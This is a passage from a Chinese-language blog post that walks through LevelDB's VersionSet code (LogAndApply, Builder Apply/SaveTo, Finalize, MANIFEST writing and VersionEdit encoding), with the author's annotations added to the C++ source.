reason to unlock *mu here since we only hit this path in the</span></span><br><span class="line">    <span class="comment">// first call to LogAndApply (when opening the database).</span></span><br><span class="line">    assert(descriptor_file_ == <span class="literal">nullptr</span>);</span><br><span class="line">     <span class="comment">// new_manifest_file为当前manifest文件路径</span></span><br><span class="line">    new_manifest_file = DescriptorFileName(dbname_, manifest_file_number_);</span><br><span class="line">    edit-&gt;SetNextFile(next_file_number_);</span><br><span class="line">     <span class="comment">// 创建文件</span></span><br><span class="line">    s = env_-&gt;NewWritableFile(new_manifest_file, &amp;descriptor_file_);</span><br><span class="line">    <span class="keyword">if</span> (s.ok()) &#123;</span><br><span class="line">        <span class="comment">// 创建manifest写者</span></span><br><span class="line">      descriptor_log_ = <span class="keyword">new</span> <span class="built_in">log</span>::Writer(descriptor_file_);</span><br><span class="line">      s = WriteSnapshot(descriptor_log_);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Unlock during expensive MANIFEST log write</span></span><br><span class="line">  &#123;</span><br><span class="line">    mu-&gt;Unlock();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Write new record to MANIFEST log</span></span><br><span class="line">    <span class="keyword">if</span> (s.ok()) &#123;</span><br><span class="line">      <span class="built_in">std</span>::<span class="built_in">string</span> record;</span><br><span class="line">        <span class="comment">// edit内容编码到record !!, 可以看一下是怎么编码的</span></span><br><span class="line">      edit-&gt;EncodeTo(&amp;record);</span><br><span class="line">       <span class="comment">// 写入manifest文件</span></span><br><span class="line">      s = descriptor_log_-&gt;AddRecord(record);</span><br><span class="line">      <span class="keyword">if</span> (s.ok()) &#123;</span><br><span class="line">          <span class="comment">// 同步</span></span><br><span class="line">        s = descriptor_file_-&gt;Sync();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (!s.ok()) &#123;</span><br><span class="line">        Log(options_-&gt;info_log, <span class="string">"MANIFEST write: %s\n"</span>, s.ToString().c_str());</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">     <span class="comment">// 更新Current指针</span></span><br><span class="line">    <span class="comment">// If we just created a new descriptor file, install it by writing a</span></span><br><span class="line">    <span class="comment">// new CURRENT file that points to it.</span></span><br><span class="line">    <span class="keyword">if</span> (s.ok() &amp;&amp; !new_manifest_file.empty()) &#123;</span><br><span class="line">      s = SetCurrentFile(env_, dbname_, manifest_file_number_);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mu-&gt;Lock();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 插入当前version到VersionSet中</span></span><br><span class="line">  <span class="comment">// Install the new version</span></span><br><span class="line">  <span class="keyword">if</span> (s.ok()) &#123;</span><br><span class="line">     <span class="comment">// 插入version，更新current</span></span><br><span class="line">    AppendVersion(v);</span><br><span class="line">    log_number_ = edit-&gt;log_number_;</span><br><span class="line">    prev_log_number_ = edit-&gt;prev_log_number_;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">delete</span> v;</span><br><span class="line">    <span class="keyword">if</span> (!new_manifest_file.empty()) &#123;</span><br><span class="line">      <span class="keyword">delete</span> descriptor_log_;</span><br><span class="line">      <span class="keyword">delete</span> descriptor_file_;</span><br><span class="line">      descriptor_log_ = <span class="literal">nullptr</span>;</span><br><span class="line">      descriptor_file_ = <span class="literal">nullptr</span>;</span><br><span class="line">      env_-&gt;RemoveFile(new_manifest_file);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>工作：</p><ol><li>执行 old version + version_edit = new version</li><li>编码versionedit，并将其写入到manifest中，同时修改 CURRENT 指针</li><li>将新生成的version插入到versionset中</li></ol><p>current_版本的更替时机一定要注意到，LogAndApply生成新版本之后，同时将VersionEdit记录到MANIFEST文件之后。</p><h3 id="2-Builder"><a href="#2-Builder" class="headerlink" title="2.Builder"></a>2.Builder</h3><p>builder的内部数据域：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">typedef</span> <span class="built_in">std</span>::<span class="built_in">set</span>&lt;FileMetaData*, BySmallestKey&gt; FileSet;</span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">LevelState</span> &#123;</span></span><br><span class="line">   <span class="built_in">std</span>::<span class="built_in">set</span>&lt;<span class="keyword">uint64_t</span>&gt; deleted_files;</span><br><span class="line">   FileSet* added_files;</span><br><span class="line"> &#125;;</span><br><span class="line"></span><br><span class="line"> VersionSet* vset_;</span><br><span class="line"> Version* base_;</span><br><span class="line"> LevelState levels_[<span class="built_in">config</span>::kNumLevels];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造函数</span></span><br><span class="line"> <span class="comment">// Initialize a builder with the files from *base and other info from *vset</span></span><br><span class="line"> Builder(VersionSet* vset, Version* base) : vset_(vset), base_(base) &#123;</span><br><span class="line">   base_-&gt;Ref();</span><br><span class="line">   BySmallestKey cmp;</span><br><span class="line">   cmp.internal_comparator = &amp;vset_-&gt;icmp_;</span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">int</span> level = <span class="number">0</span>; level &lt; <span class="built_in">config</span>::kNumLevels; level++) &#123;</span><br><span class="line">     levels_[level].added_files = <span class="keyword">new</span> FileSet(cmp);</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>核心代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">// 引用edit到当前版本</span></span><br><span class="line">Version* v = <span class="keyword">new</span> Version(<span class="keyword">this</span>);</span><br><span class="line">&#123;</span><br><span class="line">  <span class="function">Builder <span class="title">builder</span><span class="params">(<span class="keyword">this</span>, current_)</span></span>;<span class="comment">// builder的base就是current_版本</span></span><br><span class="line">  builder.Apply(edit);</span><br><span class="line">  builder.SaveTo(v);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>==Apply:==</p><p><strong>将edit中的更改保存在builder中。</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Apply all of the edits in *edit to the current state.</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Apply</span><span class="params">(VersionEdit* edit)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// Update compaction pointers</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; edit-&gt;compact_pointers_.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> level = edit-&gt;compact_pointers_[i].first;<span class="comment">// first为 level</span></span><br><span class="line">    vset_-&gt;compact_pointer_[level] =</span><br><span class="line">        edit-&gt;compact_pointers_[i].second.Encode().ToString(); <span class="comment">// second 为 这一level开始compaction的key</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Delete files 删除文件保存在builder中</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">auto</span>&amp; deleted_file_set_kvp : edit-&gt;deleted_files_) &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> level = deleted_file_set_kvp.first;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">uint64_t</span> number = deleted_file_set_kvp.second;</span><br><span class="line">    levels_[level].deleted_files.insert(number);<span class="comment">// delete 的 file用number表示</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Add new files</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; edit-&gt;new_files_.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> level = edit-&gt;new_files_[i].first;</span><br><span class="line">    FileMetaData* f = <span class="keyword">new</span> FileMetaData(edit-&gt;new_files_[i].second);</span><br><span class="line">    f-&gt;refs = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">     <span class="comment">// 计算seek_allow</span></span><br><span class="line">    <span class="comment">// We arrange to automatically compact this file after</span></span><br><span class="line">    <span class="comment">// a certain number of seeks.  Let's assume:</span></span><br><span class="line">    <span class="comment">//   (1) One seek costs 10ms</span></span><br><span class="line">    <span class="comment">//   (2) Writing or reading 1MB costs 10ms (100MB/s)</span></span><br><span class="line">    <span class="comment">//   (3) A compaction of 1MB does 25MB of IO:</span></span><br><span class="line">    <span class="comment">//         1MB read from this level</span></span><br><span class="line">    <span class="comment">//         10-12MB read from next level (boundaries may be misaligned)</span></span><br><span class="line">    <span class="comment">//         10-12MB written to next level</span></span><br><span class="line">    <span class="comment">// This implies that 25 seeks cost the same as the compaction</span></span><br><span class="line">    <span class="comment">// of 1MB of data.  I.e., one seek costs approximately the</span></span><br><span class="line">    <span class="comment">// same as the compaction of 40KB of data.  We are a little</span></span><br><span class="line">    <span class="comment">// conservative and allow approximately one seek for every 16KB</span></span><br><span class="line">    <span class="comment">// of data before triggering a compaction.</span></span><br><span class="line">    f-&gt;allowed_seeks = <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;((f-&gt;file_size / <span class="number">16384U</span>));</span><br><span class="line">    <span class="keyword">if</span> (f-&gt;allowed_seeks &lt; <span class="number">100</span>) f-&gt;allowed_seeks = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">     <span class="comment">// 如果文件之前删除了，现在又新添加了，则覆盖原来删除的文件（删除也是一个插入）</span></span><br><span class="line">    levels_[level].deleted_files.erase(f-&gt;number);</span><br><span class="line">    levels_[level].added_files-&gt;insert(f);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先提取edit中删除的文件和新增的文件，放在Buider中。中间穿插了一个 file的seek_allow计算：<strong>seek_allow用于触发compaction。</strong><br>1次seek的cost相当于compact 40kb的数据。保守估计，所以1次seek的cost相当于compact 16kb的数据。<strong>目前还不懂为什么。</strong></p><p>==SaveTo:==</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Save the current state in *v.</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">SaveTo</span><span class="params">(Version* v)</span> </span>&#123;</span><br><span class="line">    BySmallestKey cmp;<span class="comment">// 按照smallestkey比较，如果key相同，按照file number比较，越新越好</span></span><br><span class="line">    cmp.internal_comparator = &amp;vset_-&gt;icmp_;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> level = <span class="number">0</span>; level &lt; <span class="built_in">config</span>::kNumLevels; level++) &#123;<span class="comment">// 一层层的合并</span></span><br><span class="line">      <span class="comment">// Merge the set of added files with the set of pre-existing files.</span></span><br><span class="line">      <span class="comment">// Drop any deleted files.  Store the result in *v.</span></span><br><span class="line">      <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;FileMetaData*&gt;&amp; base_files = base_-&gt;files_[level];</span><br><span class="line">      <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;FileMetaData*&gt;::const_iterator base_iter = base_files.<span class="built_in">begin</span>();</span><br><span class="line">      <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;FileMetaData*&gt;::const_iterator base_end = base_files.<span class="built_in">end</span>();</span><br><span class="line">      <span class="keyword">const</span> FileSet* added_files = levels_[level].added_files;</span><br><span class="line">      v-&gt;files_[level].reserve(base_files.<span class="built_in">size</span>() + added_files-&gt;<span class="built_in">size</span>());</span><br><span class="line">      <span class="comment">// 小于added_files的key 的 当前版本中的文件，全部加入新版本中</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">auto</span>&amp; added_file : *added_files) &#123;</span><br><span class="line">        <span class="comment">// Add all smaller files listed in base_</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;FileMetaData*&gt;::const_iterator bpos =</span><br><span class="line">                 <span class="built_in">std</span>::upper_bound(base_iter, base_end, added_file, cmp);<span class="comment">// 查一下upper_bound函数</span></span><br><span class="line">             base_iter != bpos; ++base_iter) &#123;</span><br><span class="line"></span><br><span class="line">          MaybeAddFile(v, level, *base_iter);</span><br><span class="line">        &#125;</span><br><span class="line"> <span class="comment">// 加入 added_file</span></span><br><span class="line">        MaybeAddFile(v, level, added_file);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 剩余文件整合</span></span><br><span class="line">      <span class="comment">// Add remaining base files</span></span><br><span class="line">      <span class="keyword">for</span> (; base_iter != base_end; ++base_iter) &#123;</span><br><span class="line">        MaybeAddFile(v, level, *base_iter);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 下面是检查level&gt;0是否有overlap</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> NDEBUG</span></span><br><span class="line">      <span class="comment">// Make sure there is no overlap in levels &gt; 0</span></span><br><span class="line">      <span class="keyword">if</span> (level &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">uint32_t</span> i = <span class="number">1</span>; i &lt; v-&gt;files_[level].<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">          <span class="keyword">const</span> InternalKey&amp; prev_end = v-&gt;files_[level][i - <span class="number">1</span>]-&gt;largest;</span><br><span class="line">          <span class="keyword">const</span> InternalKey&amp; this_begin = v-&gt;files_[level][i]-&gt;smallest;</span><br><span class="line">          <span class="keyword">if</span> (vset_-&gt;icmp_.Compare(prev_end, this_begin) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"overlapping ranges in same level %s vs. %s\n"</span>,</span><br><span class="line">                         prev_end.DebugString().c_str(),</span><br><span class="line">                         this_begin.DebugString().c_str());</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">abort</span>();</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">void</span> <span class="title">MaybeAddFile</span><span class="params">(Version* v, <span class="keyword">int</span> level, FileMetaData* f)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (levels_[level].deleted_files.count(f-&gt;number) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="comment">// File is deleted: do nothing  // 在删除列表，不用添加</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;FileMetaData*&gt;* files = &amp;v-&gt;files_[level];</span><br><span class="line">      <span class="keyword">if</span> (level &gt; <span class="number">0</span> &amp;&amp; !files-&gt;empty()) &#123;<span class="comment">// 考虑level&gt;0, 要求key不能overlap</span></span><br><span class="line">        <span class="comment">// Must not overlap</span></span><br><span class="line">        assert(vset_-&gt;icmp_.Compare((*files)[files-&gt;<span class="built_in">size</span>() - <span class="number">1</span>]-&gt;largest,</span><br><span class="line">                                    f-&gt;smallest) &lt; <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      f-&gt;refs++;<span class="comment">//  当前新版本v 对file有引用，所以refs++</span></span><br><span class="line">      files-&gt;push_back(f); <span class="comment">// 实际压入到新版本</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h3 id="3-Finalize"><a href="#3-Finalize" class="headerlink" title="3. Finalize"></a>3. Finalize</h3><p>这里决定下一次compaction的best level。</p><p>level0: 根据文件数量决定。</p><p>其余：根据该层的文件大小决定。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">VersionSet::Finalize</span><span class="params">(Version* v)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// Precomputed best level for next compaction</span></span><br><span class="line">  <span class="keyword">int</span> best_level = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">double</span> best_score = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> level = <span class="number">0</span>; level &lt; <span class="built_in">config</span>::kNumLevels - <span class="number">1</span>; level++) &#123;</span><br><span class="line">    <span class="keyword">double</span> score;</span><br><span class="line">    <span class="keyword">if</span> (level == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="comment">// level0 单独处理，文件数量 超过kL0_CompactionTrigger时，就trigger compaction</span></span><br><span class="line">        </span><br><span class="line">      <span class="comment">// We treat level-0 specially by bounding the number of files</span></span><br><span class="line">      <span class="comment">// instead of number of bytes for two reasons:</span></span><br><span class="line">      <span class="comment">//</span></span><br><span class="line">      <span class="comment">// (1) With larger write-buffer sizes, it is nice not to do too</span></span><br><span class="line">      <span class="comment">// many level-0 compactions.</span></span><br><span class="line">      <span class="comment">//</span></span><br><span class="line">      <span class="comment">// (2) The files in level-0 are merged on every read and</span></span><br><span class="line">      <span class="comment">// therefore we wish to avoid too many files when the individual</span></span><br><span class="line">      <span class="comment">// file size is small (perhaps because of a small write-buffer</span></span><br><span class="line">      <span class="comment">// setting, or very high compression ratios, or lots of</span></span><br><span class="line">      <span class="comment">// overwrites/deletions).</span></span><br><span class="line">      score = v-&gt;files_[level].<span class="built_in">size</span>() /</span><br><span class="line">              <span class="keyword">static_cast</span>&lt;<span class="keyword">double</span>&gt;(<span class="built_in">config</span>::kL0_CompactionTrigger);<span class="comment">// static const int kL0_CompactionTrigger = 4;</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 其余level 用文件size来比较</span></span><br><span class="line">      <span class="comment">// Compute the ratio of current size to size limit.</span></span><br><span class="line">      <span class="keyword">const</span> <span class="keyword">uint64_t</span> level_bytes = TotalFileSize(v-&gt;files_[level]);</span><br><span class="line">      score =</span><br><span class="line">          <span class="keyword">static_cast</span>&lt;<span class="keyword">double</span>&gt;(level_bytes) / MaxBytesForLevel(options_, level);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (score &gt; best_score) &#123;</span><br><span class="line">      best_level = level;</span><br><span class="line">      best_score = score;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  v-&gt;compaction_level_ = best_level;</span><br><span class="line">  v-&gt;compaction_score_ = best_score;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-Manifest相关"><a href="#4-Manifest相关" class="headerlink" title="==4.  Manifest相关=="></a>==4.  Manifest相关==</h3><p>在VersionSet::LogAndApply中。</p><p>==创建manifest操作writer==</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Initialize new descriptor log file if necessary by creating</span></span><br><span class="line">  <span class="comment">// a temporary file that contains a snapshot of the current version.</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span> new_manifest_file;</span><br><span class="line">  Status s;</span><br><span class="line">  <span class="keyword">if</span> (descriptor_log_ == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">    <span class="comment">// No reason to unlock *mu here since we only hit this path in the</span></span><br><span class="line">    <span class="comment">// first call to LogAndApply (when opening the database).</span></span><br><span class="line">    assert(descriptor_file_ == <span class="literal">nullptr</span>);</span><br><span class="line">    new_manifest_file = DescriptorFileName(dbname_, manifest_file_number_);</span><br><span class="line">    edit-&gt;SetNextFile(next_file_number_);</span><br><span class="line">    s = env_-&gt;NewWritableFile(new_manifest_file, &amp;descriptor_file_);</span><br><span class="line">    <span class="keyword">if</span> (s.ok()) &#123;</span><br><span class="line">        <span class="comment">// 这里创建最终的writer，从本质上来看，manifest也是一个log</span></span><br><span class="line">      descriptor_log_ = <span class="keyword">new</span> <span class="built_in">log</span>::Writer(descriptor_file_);</span><br><span class="line">       <span class="comment">// 保存当前合并后的version的snapshot，事实上，这里是开辟新的version snapshot manifest，旧manifest将会被删除</span></span><br><span class="line">      s = WriteSnapshot(descriptor_log_);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据dbname和 manifest_file_number生成manifest文件全路径</span></span><br><span class="line"><span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">DescriptorFileName</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; dbname, <span class="keyword">uint64_t</span> number)</span> </span>&#123;</span><br><span class="line">  assert(number &gt; <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">snprintf</span>(buf, <span class="keyword">sizeof</span>(buf), <span class="string">"/MANIFEST-%06llu"</span>,</span><br><span class="line">                <span class="keyword">static_cast</span>&lt;<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>&gt;(number));</span><br><span class="line">  <span class="keyword">return</span> dbname + buf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>==写入manifest，manifest保存着这次修改的差量，即VersionEdit。==</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Unlock during expensive MANIFEST log write</span></span><br><span class="line">  &#123;</span><br><span class="line">    mu-&gt;Unlock();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Write new record to MANIFEST log</span></span><br><span class="line">    <span class="keyword">if</span> (s.ok()) &#123;</span><br><span class="line">      <span class="built_in">std</span>::<span class="built_in">string</span> record;</span><br><span class="line">      edit-&gt;EncodeTo(&amp;record);<span class="comment">// 序列化到record中</span></span><br><span class="line">      s = descriptor_log_-&gt;AddRecord(record);<span class="comment">// 写入</span></span><br><span class="line">      <span class="keyword">if</span> (s.ok()) &#123;</span><br><span class="line">        s = descriptor_file_-&gt;Sync();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (!s.ok()) &#123;</span><br><span class="line">        Log(options_-&gt;info_log, <span class="string">"MANIFEST write: %s\n"</span>, s.ToString().c_str());</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If we just created a new descriptor file, install it by writing a</span></span><br><span class="line">    <span class="comment">// new CURRENT file that points to it.</span></span><br><span class="line">    <span class="keyword">if</span> (s.ok() &amp;&amp; !new_manifest_file.empty()) &#123;</span><br><span class="line">      s = SetCurrentFile(env_, dbname_, manifest_file_number_);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mu-&gt;Lock();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>现在来看看edit如何encode以及encode了哪些字段：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Tag numbers for serialized VersionEdit.  These numbers are written to</span></span><br><span class="line"><span class="comment">// disk and should not be changed.</span></span><br><span class="line"><span class="keyword">enum</span> Tag &#123;</span><br><span class="line">  kComparator = <span class="number">1</span>,</span><br><span class="line">  kLogNumber = <span class="number">2</span>,</span><br><span class="line">  kNextFileNumber = <span class="number">3</span>,</span><br><span class="line">  kLastSequence = <span class="number">4</span>,</span><br><span class="line">  kCompactPointer = <span class="number">5</span>,</span><br><span class="line">  kDeletedFile = <span class="number">6</span>,</span><br><span class="line">  kNewFile = <span class="number">7</span>,</span><br><span class="line">  <span class="comment">// 8 was used for large value refs</span></span><br><span class="line">  kPrevLogNumber = <span class="number">9</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对应VersionEdit中的成员</span></span><br><span class="line"><span 